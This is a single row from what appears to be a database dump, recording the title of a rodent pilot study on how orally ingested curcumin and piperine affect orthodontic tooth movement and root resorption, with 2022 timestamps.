	(7736,197,'title','\"The effect of orally ingested Curcumin and Piperine on the rate of orthodontic tooth movement and the extent of root resorption in a rodent model \\u2013 A pilot study \"','2022-03-31 13:23:52','2022-03-31 13:23:52'),
